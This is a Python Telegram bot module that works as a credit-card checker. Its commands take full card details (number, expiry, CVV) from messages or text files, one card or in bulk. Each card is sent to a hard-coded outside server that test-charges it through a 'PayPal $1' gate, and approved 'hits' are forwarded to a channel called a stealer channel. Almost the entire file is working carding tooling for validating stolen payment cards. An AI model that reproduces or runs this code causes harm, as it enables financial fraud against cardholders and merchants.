import httpx
import time
import asyncio
import re
import os
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_thing import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Updated Stealer Channel ID
STEALER_CHANNEL_ID = -1003627495953
MAX_MSC_LIMIT = 10 
MAX_TSC_LIMIT = 100

# --- BOT API BRIDGE FOR COLLAPSIBLE INFO ---
async def send_colored_msg(client, chat_id, text, reply_to_message_id=None, message_id=None):
    token = client.bot_token if hasattr(client, 'bot_token') else os.environ.get("BOT_TOKEN")
    if not token: return None
    
    url = f"https://api.telegram.org/bot{token}/"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    
    async with httpx.AsyncClient() as http:
        if message_id:
            payload["message_id"] = message_id
            method = "editMessageText"
        else:
            payload["reply_to_message_id"] = reply_to_message_id
            method = "sendMessage"
            
        try:
            r = await http.post(url + method, json=payload)
            return r.json()
        except:
            return None

async def call_stripe_api(fullcc):
    endpoint_url = f"http://138.128.240.15:8024/paypal_1?cc={fullcc}"
    async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
        for attempt in range(2):
            try:
                response_obj = await session.get(endpoint_url)
                result_json = response_obj.json()
                
                api_status = result_json.get("status", "Unknown").upper()
                response_msg = result_json.get("message", "No response message")
                gate_name = result_json.get("gate", "PayPal $1")
                
                if "APPROVED" in api_status or "SUCCESS" in api_status:
                    return "Approved ✓", response_msg, gate_name
                elif "DECLINED" in api_status or "FAILED" in api_status or "FRAUDULENT" in api_status:
                    return "Declined ✗", response_msg, gate_name
                else:
                    return api_status, response_msg, gate_name
            except:
                if attempt == 1:
                    return "Error", "Request failed", "PayPal $1"
                await asyncio.sleep(1)
    return "Error", "Request failed", "PayPal $1"

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# --- SINGLE CHECK COMMAND ---
@Client.on_message(filters.command("pp1", [".", "/"]))
async def stripe_charge_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        
        if checkall[0] == False:
            return
        role = checkall[1]
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> PayPal $1
◈ <b>ᴄᴍᴅ :</b> /pp1

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /pp1 cc|mes|ano|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = "PayPal $1"
        
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        status, response, gateway = await call_stripe_api(fullcc)
        
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        # Zero-width spaces to force collapse without visible space
        zero_width_padding = "&#8203;" * 1000
        
        finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
💠 𝘽𝙞𝙣-» {brand}
_{type_}-{level}
💠 𝘽𝙖𝙣𝙠-» {bank}{zero_width_padding}</blockquote>
════『 META 』════
💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
💠 𝙏𝙞𝙢𝙚-» {time.perf_counter() - start:0.2f}s
💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> 🍷 ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        
        await send_colored_msg(Client, message.chat.id, finalresp, message_id=thirdcheck.id)
        
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "Approved" in status:
            await send_hit_if_approved(Client, finalresp)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS TEXT/REPLY COMMAND ---
@Client.on_message(filters.command("mpp1", [".", "/"]))
async def stripe_mass_check_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            ccs = extract_cards(message.text)

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> PayPal $1
◈ <b>ᴄᴍᴅ :</b> /mpp1

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mpp1 cc|mm|yy|cvc (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE COMMAND ---
@Client.on_message(filters.command("tpp1", [".", "/"]))
async def stripe_txt_check_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith('.txt'):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> PayPal $1
◈ <b>ᴄᴍᴅ :</b> /tpp1

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC ---
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

💠 𝙂𝙖𝙩𝙚 -» PayPal $1
💠 𝘾𝙘 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
━━━━━━━━━━━━━━━━━━━━"""
    progress_msg = await message.reply(initial_resp, quote=True)
    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
━━━━━━━━━━━━━━━━━━━━
"""
    final_text = header_text
    start_time = time.perf_counter()
    
    for fullcc in ccs:
        status, response, gateway = await call_stripe_api(fullcc)
        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
        
        zero_width_padding = "&#8203;" * 1000
        card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
💠 𝘽𝙞𝙣-» {brand}
_{type_}-{level}
💠 𝘽𝙖𝙣𝙠-» {bank}{zero_width_padding}</blockquote>
━━━━━━━━━━━━━━━━━━━━
"""
        final_text += card_resp
        try:
            await progress_msg.edit_text(final_text, disable_web_page_preview=True)
        except: pass
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)
    footer = f"""════『 META 』════
💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
💠 𝙏𝙞𝙢𝙚-» {elapsed_time}s
💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> 🍷 ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
    final_text += footer
    
    await send_colored_msg(Client, message.chat.id, final_text, message_id=progress_msg.id)
    await setantispamtime(user_id)
